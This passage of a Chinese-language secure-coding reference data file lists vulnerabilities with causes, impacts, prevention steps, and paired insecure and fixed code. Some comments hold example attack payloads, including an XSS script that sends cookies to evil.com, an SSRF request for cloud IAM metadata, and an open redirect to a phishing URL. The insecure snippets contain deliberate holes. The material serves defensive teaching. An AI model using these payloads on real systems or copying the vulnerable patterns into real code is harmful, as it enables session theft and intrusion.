      'X-Frame-Options: DENY 或 SAMEORIGIN',
      'X-Content-Type-Options: nosniff',
      'Referrer-Policy: strict-origin-when-cross-origin',
      'Permissions-Policy: 限制浏览器 API (摄像头、麦克风、定位)',
    ],
    vulnerableCode: {
      language: 'nginx',
      code: `# 不安全: 无任何安全头
server {
    listen 80;
    server_name example.com;
    location / {
        proxy_pass http://localhost:3000;
    }
}`,
    },
    fixedCode: {
      language: 'nginx',
      code: `# 安全: 完整安全头配置
server {
    listen 443 ssl http2;
    server_name example.com;

    # 防 XSS
    add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'" always;
    # 防 Clickjacking
    add_header X-Frame-Options "DENY" always;
    # 防 MIME 嗅探
    add_header X-Content-Type-Options "nosniff" always;
    # 隐私保护
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    # 限制浏览器特性
    add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;

    location / {
        proxy_pass http://localhost:3000;
    }
}`,
    },
    languages: ['All'],
    references: [
      'https://owasp.org/www-project-secure-headers/',
      'https://securityheaders.com/',
    ],
  },
  {
    id: 'default-credentials',
    title: '默认凭据未修改',
    titleEn: 'Default Credentials',
    category: 'misconfiguration',
    severity: 'critical',
    cwe: 'CWE-1392',
    owasp: 'A05:2021',
    description: '使用软件出厂默认的用户名和密码 (admin/admin, root/toor, sa/<空>), 攻击者通过已知默认凭据列表即可直接获取系统最高权限。',
    cause: '部署后未修改默认密码;自动化脚本中使用了厂商默认凭据;示例代码/Docker 镜像直接用于生产。',
    impact: '系统被完全接管、数据库被勒索、设备加入僵尸网络。',
    prevention: [
      '部署流程中强制修改所有默认凭据',
      '使用密码管理工具为每个实例生成唯一强密码',
      '部署前扫描镜像和配置中的默认凭据',
      '首次登录强制要求修改密码',
    ],
    vulnerableCode: {
      language: 'dockerfile',
      code: `# 不安全: 默认密码
FROM postgres:15
ENV POSTGRES_PASSWORD=postgres
# 任意知道该镜像的人都能访问数据库`,
    },
    fixedCode: {
      language: 'dockerfile',
      code: `# 安全: 通过 Docker Secret 注入密码
FROM postgres:15
ENV POSTGRES_PASSWORD_FILE=/run/secrets/db_password
# 运行时: echo "MyStr0ng!Pass" | docker secret create db_password -`,
    },
    languages: ['All'],
    references: ['https://cwe.mitre.org/data/definitions/1392.html'],
  },

  // ==================== XSS ====================
  {
    id: 'reflected-xss',
    title: '反射型 XSS',
    titleEn: 'Reflected XSS',
    category: 'xss',
    severity: 'high',
    cwe: 'CWE-79',
    owasp: 'A03:2021',
    description: '恶意脚本通过 URL 参数、表单提交等方式传入服务器,服务器将输入原样返回在响应页面中,浏览器解析执行该脚本。需诱导用户点击恶意链接触发。',
    cause: '服务端将 HTTP 请求参数未经编码直接输出到 HTML 响应中,如直接将 GET/POST 参数拼接进页面模板。',
    impact: '会话 Cookie 窃取、钓鱼、页面篡改、恶意重定向、键盘记录。',
    prevention: [
      '对所有输出到 HTML 的数据做上下文感知的编码',
      '使用模板引擎的自动转义功能 (如 Jinja2、Thymeleaf)',
      '实施严格 Content-Security-Policy (禁用 inline script)',
      '输入校验 + 输出编码双重防护',
    ],
    vulnerableCode: {
      language: 'php',
      code: `<?php
// 不安全: 直接输出用户输入
echo "<h1>搜索结果: " . $_GET['q'] . "</h1>";
// URL: /search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>
?>`,
    },
    fixedCode: {
      language: 'php',
      code: `<?php
// 安全: 上下文感知编码
echo "<h1>搜索结果: "
    . htmlspecialchars($_GET['q'], ENT_QUOTES | ENT_HTML5, 'UTF-8')
    . "</h1>";
?>`,
    },
    languages: ['PHP', 'Java', 'Python', 'C#', 'JavaScript', 'Ruby'],
    references: [
      'https://owasp.org/www-community/attacks/xss/',
      'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
    ],
  },
  {
    id: 'stored-xss',
    title: '存储型 XSS',
    titleEn: 'Stored XSS',
    category: 'xss',
    severity: 'critical',
    cwe: 'CWE-79',
    owasp: 'A03:2021',
    description: '恶意脚本被永久存储在服务器 (评论、用户名、文章等),每当任何用户访问包含该数据的页面时脚本自动执行。比反射型 XSS 危害大得多。',
    cause: '存储用户生成内容前未做 HTML 清理,渲染存储内容时未做输出编码。',
    impact: '大规模 Cookie 窃取、XSS 蠕虫自主传播、账户完全接管、后台持久化后门。',
    prevention: [
      '存储前使用 DOMPurify / OWASP Java HTML Sanitizer 等服务端库清理 HTML',
      '输出时始终做上下文编码',
      '使用 Content-Security-Policy: default-src \'self\'',
      '输入白名单验证 (如只允许纯文本)',
    ],
    vulnerableCode: {
      language: 'javascript',
      code: `// 不安全: 存储和输出均未过滤
app.post("/comment", (req, res) => {
  db.comments.insert({ text: req.body.comment });
  res.redirect("/");
});

app.get("/", (req, res) => {
  const comments = db.comments.find();
  let html = comments.map(c => \`<p>\${c.text}</p>\`).join("");
  res.send(html);
  // 攻击: comment = <script>fetch('/steal?c='+document.cookie)</script>
});`,
    },
    fixedCode: {
      language: 'javascript',
      code: `// 安全: 存储前清理 + 输出编码
const sanitizeHtml = require("sanitize-html");

app.post("/comment", (req, res) => {
  const clean = sanitizeHtml(req.body.comment, {
    allowedTags: [],        // 不允许任何 HTML 标签
    allowedAttributes: {},  // 不允许任何属性
  });
  db.comments.insert({ text: clean });
});`,
    },
    languages: ['JavaScript', 'PHP', 'Python', 'Java', 'Ruby'],
    references: [
      'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
    ],
  },
  {
    id: 'dom-xss',
    title: 'DOM 型 XSS',
    titleEn: 'DOM-based XSS',
    category: 'xss',
    severity: 'high',
    cwe: 'CWE-79',
    owasp: 'A03:2021',
    description: '攻击载荷不经过服务端,完全在客户端通过 JavaScript 操作 DOM 时引入。常见于读取 URL hash、postMessage、localStorage 等源后写入 innerHTML。',
    cause: '客户端 JS 使用 innerHTML、outerHTML、document.write()、eval() 等危险方法处理用户可控的浏览器数据源。',
    impact: '客户端凭证窃取、会话劫持、页面篡改、恶意扩展加载。',
    prevention: [
      '避免使用 innerHTML、document.write() —— 使用 textContent 或 createTextNode',
      '若必须插入 HTML,先用 DOMPurify 清理',
      '绝不可将用户数据传入 eval()、setTimeout(string)、new Function()',
      '使用框架的内置 XSS 防护 (Vue/React 的自动转义)',
    ],
    vulnerableCode: {
      language: 'javascript',
      code: `// 不安全: URL hash -> innerHTML
const name = location.hash.substring(1);
document.getElementById("greeting").innerHTML = \`Hello \${name}!\`;
// URL: /#<img src=x onerror="alert(document.cookie)">`,
    },
    fixedCode: {
      language: 'javascript',
      code: `// 安全: 使用 textContent (自动编码)
const name = location.hash.substring(1);
document.getElementById("greeting").textContent = \`Hello \${name}!\`;
// 或使用 DOMPurify
import DOMPurify from "dompurify";
document.getElementById("greeting").innerHTML = DOMPurify.sanitize(name);`,
    },
    languages: ['JavaScript'],
    references: ['https://owasp.org/www-community/attacks/DOM_Based_XSS'],
  },

  // ==================== DESERIALIZATION ====================
  {
    id: 'java-deserialization',
    title: 'Java 反序列化漏洞',
    titleEn: 'Java Deserialization',
    category: 'deserialization',
    severity: 'critical',
    cwe: 'CWE-502',
    owasp: 'A08:2021',
    description: 'Java 反序列化不可信数据时可触发恶意构造的对象链 (gadget chain) 执行任意代码。2017 年 Equifax 数据泄露 (1.47亿用户) 即为 Apache Struts2 反序列化漏洞所致。',
    cause: 'ObjectInputStream 从不可信来源反序列化数据且未做输入过滤;classpath 中存在可利用的 gadget chain 类 (如 Commons Collections)。',
    impact: '远程代码执行 (RCE)、服务器完全控制、数据批量泄露。',
    prevention: [
      '绝不对不可信数据进行 Java 原生序列化/反序列化',
      '使用 JSON、Protobuf、Avro 等纯数据格式替代',
      '升级依赖库以移除已知 gadget chain',
      '使用 JEP 290 序列化过滤器限制可反序列化的类',
    ],
    vulnerableCode: {
      language: 'java',
      code: `// 不安全: 反序列化任意来源数据
public Object deserialize(byte[] data) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(
        new ByteArrayInputStream(data));
    return ois.readObject(); // 恶意数据 -> RCE
}`,
    },
    fixedCode: {
      language: 'java',
      code: `// 安全: 序列化过滤器 (JEP 290)
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "maxarray=100000;maxdepth=20;!com.evil.*");
ObjectInputStream ois = new ObjectInputStream(
    new ByteArrayInputStream(data));
ois.setObjectInputFilter(filter);
return ois.readObject();

// 更好的做法: 使用 Jackson/Gson 做 JSON 反序列化
ObjectMapper mapper = new ObjectMapper();
MyDTO obj = mapper.readValue(jsonData, MyDTO.class);`,
    },
    languages: ['Java'],
    references: [
      'https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data',
      'https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html',
    ],
  },
  {
    id: 'php-object-injection',
    title: 'PHP 对象注入',
    titleEn: 'PHP Object Injection',
    category: 'deserialization',
    severity: 'critical',
    cwe: 'CWE-502',
    owasp: 'A08:2021',
    description: 'PHP unserialize() 处理用户输入时可触发魔术方法 (__wakeup、__destruct、__toString 等), 通过 POP 链实现任意代码执行或文件操作。',
    cause: '将用户可控数据传给 unserialize();代码中存在可利用的 POP (Property Oriented Programming) 链。',
    impact: '远程代码执行、任意文件读写/删除、数据库操作。',
    prevention: [
      '绝不使用 unserialize() 处理用户输入 —— 使用 json_decode() 替代',
      '若必须使用,使用 allowed_classes 选项限制可反序列化的类',
      '对序列化数据进行 HMAC 签名,验证完整性',
      '升级至 PHP 8.1+ 利用更严格的类型检查',
    ],
    vulnerableCode: {
      language: 'php',
      code: `<?php
// 不安全: 反序列化用户 Cookie
$cookie = $_COOKIE['user_data'];
$user = unserialize($cookie);
echo 'Welcome ' . $user->name;
// 恶意序列化数据可触发 RCE
?>`,
    },
    fixedCode: {
      language: 'php',
      code: `<?php
// 安全: 使用 JSON 替代
$cookie = $_COOKIE['user_data'];
$data = json_decode($cookie, true);
if (json_last_error() === JSON_ERROR_NONE && isset($data['name'])) {
    echo 'Welcome ' . htmlspecialchars($data['name'], ENT_QUOTES, 'UTF-8');
}
?>`,
    },
    languages: ['PHP'],
    references: ['https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection'],
  },
  {
    id: 'python-pickle',
    title: 'Python Pickle 反序列化',
    titleEn: 'Python Pickle Deserialization',
    category: 'deserialization',
    severity: 'critical',
    cwe: 'CWE-502',
    owasp: 'A08:2021',
    description: 'Python 的 pickle 模块反序列化不可信数据时可导致任意代码执行,pickle 的 __reduce__ 方法协议允许指定任意可调用对象。',
    cause: '使用 pickle.loads() 从用户输入、网络请求等不可信来源反序列化数据。',
    impact: '远程代码执行、服务器完全控制。',
    prevention: [
      '禁用 pickle 处理不可信数据 —— 使用 JSON、msgpack 替代',
      '若必须使用 pickle, 用 HMAC 签名验证数据完整性',
      '在隔离沙箱中执行反序列化',
      '使用 RestrictedPython 限制 pickle 可执行的范围',
    ],
    vulnerableCode: {
      language: 'python',
      code: `# 不安全: pickle 反序列化用户数据
import pickle, base64

@app.get("/load")
def load():
    data = base64.b64decode(request.args.get("data"))
    obj = pickle.loads(data)  # 危险! 可执行任意 Python 代码
    return str(obj)`,
    },
    fixedCode: {
      language: 'python',
      code: `# 安全: 使用 JSON
import json

@app.get("/load")
def load():
    data = request.args.get("data")
    try:
        obj = json.loads(data)
        return json.dumps(obj, ensure_ascii=False)
    except json.JSONDecodeError:
        return '{"error": "Invalid JSON"}', 400`,
    },
    languages: ['Python'],
    references: [
      'https://docs.python.org/3/library/pickle.html#module-pickle',
      'https://cwe.mitre.org/data/definitions/502.html',
    ],
  },

  // ==================== VULNERABLE COMPONENTS ====================
  {
    id: 'outdated-libs',
    title: '使用已知漏洞组件',
    titleEn: 'Using Components with Known Vulnerabilities',
    category: 'vulnerable-components',
    severity: 'high',
    cwe: 'CWE-1104',
    owasp: 'A06:2021',
    description: '项目依赖的第三方库/框架存在已公开披露的安全漏洞 (CVE) 而未及时升级。Equifax 数据泄露的根本原因就是未及时修补 Apache Struts2 的已知漏洞 (CVE-2017-5638)。',
    cause: '缺乏依赖管理和监控流程;未订阅安全公告;没有自动化依赖扫描;Open Source 安全工具链缺失。',
    impact: '攻击者使用公开 PoC 直接利用已知漏洞,成本极低;一条 CVE 可影响数百万应用。',
    prevention: [
      '集成依赖扫描到 CI/CD: npm audit、OWASP Dependency-Check、Snyk、Dependabot',
      '自动化依赖更新 (Renovate / Dependabot) 并设置自动合并 patch 更新',
      '订阅所用框架和关键库的安全通告邮件列表',
      '维护 SBOM (软件物料清单), 明确每个组件的版本和来源',
      '定期进行依赖审计并将其纳入迭代计划',
    ],
    vulnerableCode: {
      language: 'json',
      code: `{
  "dependencies": {
    "lodash": "4.17.15",
    "express": "4.16.0",
    "moment": "2.24.0",
    "axios": "0.19.0"
  }
}`,
    },
    fixedCode: {
      language: 'json',
      code: `{
  "scripts": {
    "audit": "npm audit",
    "audit:fix": "npm audit fix",
    "snyk:test": "snyk test",
    "snyk:monitor": "snyk monitor"
  },
  "dependencies": {
    "lodash": "^4.17.21",
    "express": "^4.18.3",
    "moment": "^2.30.1",
    "axios": "^1.6.8"
  }
}`,
    },
    languages: ['All'],
    references: [
      'https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/',
      'https://github.com/returntocorp/semgrep',
    ],
  },
  {
    id: 'dependency-confusion',
    title: '依赖混淆攻击',
    titleEn: 'Dependency Confusion',
    category: 'vulnerable-components',
    severity: 'high',
    cwe: 'CWE-427',
    owasp: 'A06:2021',
    description: '攻击者在公共仓库发布与公司内部包同名的更高版本包,由于包管理器默认优先拉取高版本,CI/CD 可能下载恶意公共包执行供应链攻击。',
    cause: '包管理器配置了多个 registry 但未正确设置内部 registry 优先;内部包未使用 scoped package。',
    impact: 'CI/CD 管道注入恶意代码、源代码和凭据窃取、生产环境植入后门。',
    prevention: [
      '使用 scoped package (@company/package-name) 区分内外部包',
      '配置 .npmrc/.pypirc 使内部 registry 对内部 scope 有最高优先级',
      '锁定所有依赖的 registry 来源',
      '使用 package-lock.json / yarn.lock / Pipfile.lock 确保一致性',
    ],
    vulnerableCode: {
      language: 'yaml',
      code: `# 不安全: 混合 registry 无优先级
# .npmrc
registry=https://registry.npmjs.org/
@mycorp:registry=https://npm.mycorp.com/`,
    },
    fixedCode: {
      language: 'yaml',
      code: `# 安全: 明确作用域隔离
# .npmrc
@mycorp:registry=https://npm.mycorp.com/
registry=https://registry.npmjs.org/
# 所有内部包使用 @mycorp 命名空间
# 公共 registry 无法覆盖 @mycorp 下的包`,
    },
    languages: ['JavaScript', 'Python', 'Java', 'Ruby'],
    references: [
      'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/13-Testing_for_Dependency_Confusion',
    ],
  },

  // ==================== SSRF ====================
  {
    id: 'ssrf',
    title: '服务端请求伪造',
    titleEn: 'Server-Side Request Forgery (SSRF)',
    category: 'ssrf',
    severity: 'high',
    cwe: 'CWE-918',
    owasp: 'A10:2021',
    description: '攻击者诱导服务器向内部网络或云元数据服务发起 HTTP 请求,绕过网络边界。2019 年 Capital One 数据泄露 (1亿用户) 正是利用 SSRF 访问 AWS 元数据获取临时凭证。',
    cause: '服务器根据用户提供的 URL 发起请求,未对目标地址做白名单校验,允许访问内网 IP 和特殊地址。',
    impact: '云凭证泄露 (169.254.169.254)、内网服务探测和攻击、端口扫描、数据中继。',
    prevention: [
      '对目标 URL 实施严格白名单 (仅允许已知的外部域名)',
      '过滤内网 IP 段: 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16',
      '限制请求协议 (只允许 HTTPS), 禁用 file://, gopher:// 等危险协议',
      '禁用自动重定向跟随,或校验每次重定向的目标地址',
      '使用网络层隔离: 出口代理 / 防火墙规则阻止到内网的出站连接',
    ],
    vulnerableCode: {
      language: 'python',
      code: `# 不安全: 用户完全控制 URL
import requests

@app.get("/fetch")
def fetch():
    url = request.args.get("url")
    resp = requests.get(url)
    return resp.text
# 攻击: /fetch?url=http://169.254.169.254/latest/meta-data/iam/`,
    },
    fixedCode: {
      language: 'python',
      code: `# 安全: 白名单 + IP 过滤 + 禁用重定向
import ipaddress, requests
from urllib.parse import urlparse

ALLOWED_HOSTS = {"api.example.com", "cdn.example.com"}
BLOCKED_NETWORKS = [
    "127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12",
    "192.168.0.0/16", "169.254.0.0/16", "0.0.0.0/8",
]

def is_safe_url(url):
    parsed = urlparse(url)
    if parsed.scheme not in ("https",):
        return False
    if parsed.hostname not in ALLOWED_HOSTS:
        return False
    ip = ipaddress.ip_address(parsed.hostname)
    for net in BLOCKED_NETWORKS:
        if ip in ipaddress.ip_network(net):
            return False
    return True

@app.get("/fetch")
def fetch():
    url = request.args.get("url")
    if not is_safe_url(url):
        abort(400)
    return requests.get(url, allow_redirects=False).text`,
    },
    languages: ['Python', 'Java', 'JavaScript', 'Go', 'PHP', 'Ruby'],
    references: [
      'https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/',
      'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html',
    ],
  },

  // ==================== CRYPTOGRAPHY ====================
  {
    id: 'weak-hashing',
    title: '使用弱哈希算法',
    titleEn: 'Weak Hashing Algorithm',
    category: 'cryptography',
    severity: 'high',
    cwe: 'CWE-328',
    owasp: 'A02:2021',
    description: '使用 MD5、SHA-1 等已被证明脆弱的哈希算法存储密码或做完整性校验,攻击者可利用彩虹表或碰撞攻击 (SHA-1 SHAttered 攻击) 破解。',
    cause: '遗留代码仍使用 MD5/SHA-1;开发者缺乏密码学知识;网上过时教程示例影响。',
    impact: '密码批量破解、数据完整性被破坏、数字签名伪造。',
    prevention: [
      '密码存储使用专用算法: bcrypt、scrypt、Argon2id (OWASP 推荐)',
      '数字签名和文件校验使用 SHA-256 或 SHA-3 系列',
      '为密码哈希添加随机 salt (每个密码独立 salt)',
      '实施哈希算法版本化,支持在线升级',
    ],
    vulnerableCode: {
      language: 'python',
      code: `# 不安全: MD5 (早已被破解, 秒级碰撞)
import hashlib

def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()
# 彩虹表可瞬间逆向常见密码`,
    },
    fixedCode: {
      language: 'python',
      code: `# 安全: bcrypt + 自动 salt
import bcrypt

def hash_password(password: str) -> bytes:
    return bcrypt.hashpw(
        password.encode(),
        bcrypt.gensalt(rounds=12)
    )

def verify_password(password: str, hashed: bytes) -> bool:
    return bcrypt.checkpw(password.encode(), hashed)`,
    },
    languages: ['Python', 'Java', 'JavaScript', 'Go', 'PHP', 'C#'],
    references: [
      'https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html',
    ],
  },
  {
    id: 'weak-random',
    title: '弱随机数生成',
    titleEn: 'Weak Random Number Generation',
    category: 'cryptography',
    severity: 'high',
    cwe: 'CWE-338',
    owasp: 'A02:2021',
    description: '使用非密码学安全的随机函数 (Math.random、rand()、mt_rand()) 生成 Token、密码重置链接、会话 ID 等安全敏感值,其输出可被预测攻击。',
    cause: '使用普通伪随机数生成器 (PRNG) 而非密码学安全的伪随机数生成器 (CSPRNG), 前者的种子和时间相关,种子空间小。',
    impact: '重置 Token 被猜解、会话 ID 被预测、加密密钥可被推导、API Key 可枚举。',
    prevention: [
      '使用 CSPRNG: Node.js crypto.randomBytes(), Python secrets, Java SecureRandom, Go crypto/rand',
      '生成足够长度的随机值 (建议 ≥ 256 位 / 32 字节)',
      '重置 Token 设计为一次性 + 短有效期 (≤ 15 分钟)',
      '使用 UUID v4 (依赖 CSPRNG)',
    ],
    vulnerableCode: {
      language: 'javascript',
      code: `// 不安全: Math.random() 不是密码学安全的
const resetToken = Math.random().toString(36).substring(2);
email.send(user.email, \`/reset?token=\${resetToken}\`);
// Math.random() 可被预测, Token 可被枚举`,
    },
    fixedCode: {
      language: 'javascript',
      code: `// 安全: crypto.randomBytes() CSPRNG
const crypto = require("crypto");

const resetToken = crypto.randomBytes(32).toString("hex");
// 同时设置过期时间
await db.resetTokens.insert({
  token_hash: crypto.createHash("sha256").update(resetToken).digest("hex"),
  user_id: user.id,
  expires_at: Date.now() + 15 * 60 * 1000, // 15 分钟
});`,
    },
    languages: ['JavaScript', 'Python', 'Java', 'PHP', 'Go', 'C#'],
    references: ['https://cwe.mitre.org/data/definitions/338.html'],
  },
  {
    id: 'improper-cert-validation',
    title: '证书验证不当',
    titleEn: 'Improper Certificate Validation',
    category: 'cryptography',
    severity: 'high',
    cwe: 'CWE-295',
    owasp: 'A02:2021',
    description: 'TLS 证书验证被禁用或实现不当 (接受自签名证书、忽略主机名不匹配、跳过证书链验证), 使得 HTTPS 的加密保护形同虚设。',
    cause: '开发时为方便绕过证书验证但忘记改回;自定义 TrustManager 信任所有证书;未实施 SSL Pinning。',
    impact: '中间人攻击者可以解密、窃听和篡改所有 HTTPS 流量。',
    prevention: [
      '绝对不在生产代码中禁用证书验证 (verify=False)',
      '使用操作系统和语言运行时的默认受信任 CA 库',
      '对高安全需求的移动 App 实施证书固定 (SSL Pinning)',
      '定期更新 CA 信任库',
    ],
    vulnerableCode: {
      language: 'python',
      code: `# 不安全: 禁用 SSL 验证
import requests
resp = requests.get("https://api.example.com", verify=False)
# 所有 HTTPS 流量可被中间人窃听和篡改`,
    },
    fixedCode: {
      language: 'python',
      code: `# 安全: 正确验证 (verify=True 是默认值)
import requests

resp = requests.get("https://api.example.com")
# verify 默认为 True, 使用系统 CA 信任库

# 高级: 指定自定义 CA Bundle
resp = requests.get(
    "https://api.example.com",
    verify="/path/to/custom-ca-bundle.pem"
)`,
    },
    languages: ['Python', 'Java', 'JavaScript', 'Go', 'C#', 'PHP'],
    references: ['https://cwe.mitre.org/data/definitions/295.html'],
  },
  {
    id: 'insecure-encryption',
    title: '使用不安全的加密算法',
    titleEn: 'Insecure Encryption Algorithm',
    category: 'cryptography',
    severity: 'critical',
    cwe: 'CWE-327',
    owasp: 'A02:2021',
    description: '使用已被破解或设计上有严重缺陷的加密算法和模式 (DES、RC4、3DES、AES-ECB、CBC 无 MAC), 导致密文可被解密或篡改而无法检测。',
    cause: '使用遗留的弱算法 (DES 56位密钥可暴力破解);ECB 模式下相同的明文块产生相同的密文块;缺少认证加密。',
    impact: '加密数据被解密、通过密文篡改进行 Padding Oracle 攻击。',
    prevention: [
      '使用 AEAD 模式: AES-256-GCM 或 ChaCha20-Poly1305',
      '密钥长度 ≥ 256 位 (AES-256), 通过 KDF 派生,定期轮换',
      '每个加密操作使用唯一的随机 Nonce / IV (≥ 96 位)',
      '使用高层加密库 (libsodium / NaCl) 而非直接调用底层原语',
    ],
    vulnerableCode: {
      language: 'python',
      code: `# 不安全: AES-ECB + 静态密钥 + 无认证
from Crypto.Cipher import AES
key = b"1234567890abcdef"  # 弱密钥
cipher = AES.new(key, AES.MODE_ECB)  # ECB 模式泄露明文模式
encrypted = cipher.encrypt(pad(data, 16))
# 密文可被修改而无法检测`,
    },
    fixedCode: {
      language: 'python',
      code: `# 安全: AES-GCM AEAD 模式
from Crypto.Cipher import AES
import os

key = os.urandom(32)   # 随机 256 位密钥
nonce = os.urandom(12)  # 随机 Nonce
cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
encrypted, tag = cipher.encrypt_and_digest(data)
# GCM 提供认证加密: 密文篡改会被检测到`,
    },
    languages: ['Python', 'Java', 'JavaScript', 'Go', 'C#', 'C++'],
    references: [
      'https://cwe.mitre.org/data/definitions/327.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html',
    ],
  },

  // ==================== RACE CONDITIONS ====================
  {
    id: 'race-condition',
    title: '竞态条件 (TOCTOU)',
    titleEn: 'Race Condition / TOCTOU',
    category: 'race-conditions',
    severity: 'high',
    cwe: 'CWE-367',
    owasp: '—',
    description: '多线程/多进程环境下对共享资源的检查和操作之间存在时间窗口 (Time-of-Check to Time-of-Use), 攻击者可在此期间修改资源状态绕过安全检查。',
    cause: '先检查条件再执行操作的分离逻辑 (如先检查文件是否可读再打开);数据库先 SELECT 再做 UPDATE 的非原子操作。',
    impact: '权限绕过、多次兑换优惠券/积分重复消费、文件系统符号链接攻击。',
    prevention: [
      '使用原子操作: 数据库 SELECT ... FOR UPDATE / UPSERT',
      '使用分布式锁 (Redis Redlock / ZooKeeper) 或本地互斥锁',
      '文件操作使用文件描述符 (open + fstat) 而非路径',
      '设计幂等操作: 每次请求带唯一 idempotency key',
    ],
    vulnerableCode: {
      language: 'java',
      code: `// 不安全: 先检查后使用 (TOCTOU)
File file = new File("/upload/" + filename);
if (file.exists() && file.isFile()) {
    // 检查和使用之间,文件可能被替换为符号链接!
    byte[] content = Files.readAllBytes(file.toPath());
    saveContent(content);
}`,
    },
    fixedCode: {
      language: 'java',
      code: `// 安全: 使用文件描述符 + 路径校验
Path baseDir = Paths.get("/upload").toRealPath();
Path filePath = baseDir.resolve(filename);
// 解析符号链接后再次校验
Path realPath = filePath.toRealPath();
if (!realPath.startsWith(baseDir)) {
    throw new SecurityException("Path traversal detected");
}
// 已打开的文件描述符不受后续文件替换影响
try (InputStream in = Files.newInputStream(realPath)) {
    saveContent(in);
}`,
    },
    languages: ['Java', 'C', 'C++', 'Go', 'Python', 'JavaScript'],
    references: ['https://cwe.mitre.org/data/definitions/367.html'],
  },

  // ==================== BUSINESS LOGIC ====================
  {
    id: 'mass-assignment',
    title: '批量赋值',
    titleEn: 'Mass Assignment',
    category: 'business-logic',
    severity: 'high',
    cwe: 'CWE-915',
    owasp: 'A01:2021',
    description: '攻击者通过在请求中添加额外的字段,批量覆盖模型中不应被用户控制的敏感属性 (role、isAdmin、balance、verified), 实现权限提升或数据篡改。',
    cause: '直接将用户请求体绑定到 ORM 模型而不指定允许字段列表;自动绑定机制被滥用。',
    impact: '权限提升为管理员、账户余额篡改、绕过业务审核流程。',
    prevention: [
      '定义明确的允许字段白名单 — 只取需要的字段',
      '使用 DTO (Data Transfer Object) 层,不直接暴露 ORM 实体',
      '关键字段 (role, isAdmin, balance) 绝不出现在自动绑定中',
      '使用 TypeScript / Pydantic 等类型系统严格定义请求体结构',
    ],
    vulnerableCode: {
      language: 'javascript',
      code: `// 不安全: 直接绑定全量请求体
app.put("/api/user/profile", async (req, res) => {
  await User.findByIdAndUpdate(req.user.id, req.body);
  // 攻击: PUT body: {"role": "admin"}
});`,
    },
    fixedCode: {
      language: 'javascript',
      code: `// 安全: 字段白名单
const ALLOWED_FIELDS = ["name", "email", "avatar", "bio"];

app.put("/api/user/profile", async (req, res) => {
  const update = {};
  for (const key of ALLOWED_FIELDS) {
    if (req.body[key] !== undefined) {
      update[key] = req.body[key];
    }
  }
  await User.findByIdAndUpdate(req.user.id, update);
});`,
    },
    languages: ['JavaScript', 'Python', 'PHP', 'Ruby', 'Java', 'C#'],
    references: [
      'https://cwe.mitre.org/data/definitions/915.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html',
    ],
  },
  {
    id: 'open-redirect',
    title: '开放重定向',
    titleEn: 'Open Redirect',
    category: 'business-logic',
    severity: 'medium',
    cwe: 'CWE-601',
    owasp: '—',
    description: '应用将用户提供 URL 作为重定向目标,攻击者可利用合法域名的信誉在钓鱼邮件中嵌入恶意链接,诱导用户访问钓鱼页面。',
    cause: '重定向 URL 取自请求参数 (如 ?redirect=xxx) 且未做域名校验。',
    impact: '钓鱼攻击提升成功率 (用户看到合法域名)、OAuth token 窃取、信誉受损。',
    prevention: [
      '使用域名/IP 白名单校验重定向目标',
      '优先使用相对路径重定向 (仅允许 / 开头的路径)',
      '显示中间页面明确告知用户即将离开站点',
      '对重定向 URL 做 HMAC 签名验证',
    ],
    vulnerableCode: {
      language: 'javascript',
      code: `// 不安全: 任意 URL 重定向
app.get("/redirect", (req, res) => {
  res.redirect(req.query.url);
});
// /redirect?url=https://evil.com/phishing`,
    },
    fixedCode: {
      language: 'javascript',
      code: `// 安全: 仅允许站内路径
const TRUSTED_PATHS = ["/", "/dashboard", "/profile", "/settings"];

app.get("/redirect", (req, res) => {
  const url = req.query.url || "/";
  if (TRUSTED_PATHS.includes(url) || url.startsWith("/")) {
    return res.redirect(url);
  }
  // 外站重定向到中间警告页面
  res.redirect(\`/leaving?target=\${encodeURIComponent(url)}\`);
});`,
    },
    languages: ['All'],
    references: ['https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html'],
  },
  {
    id: 'prototype-pollution',
    title: '原型污染',
    titleEn: 'Prototype Pollution',
    category: 'business-logic',
    severity: 'high',
    cwe: 'CWE-1321',
    owasp: 'A08:2021',
    description: 'JavaScript 特有的漏洞。攻击者通过操纵对象的 __proto__ 属性污染 Object.prototype, 影响应用中所有 JavaScript 对象的行为,可能导致逻辑绕过到 RCE。',
    cause: '递归合并对象时未过滤 __proto__ 和 constructor 属性;使用不安全的深拷贝函数。',
    impact: '属性注入导致认证绕过、拒绝服务、特定场景下实现 RCE (配合模板引擎等 gadget)。',
    prevention: [
      '使用安全的深合并库 (lodash.merge 的安全模式)',
      '创建无原型对象: Object.create(null)',
      '运行时冻结原型: Object.freeze(Object.prototype)',
      '递归合并时显式跳过 __proto__、constructor、prototype 等属性',
    ],
    vulnerableCode: {
      language: 'javascript',
      code: `// 不安全: 自定义不安全合并
function deepMerge(target, source) {
  for (let key in source) {
    if (typeof source[key] === "object") {
      deepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}
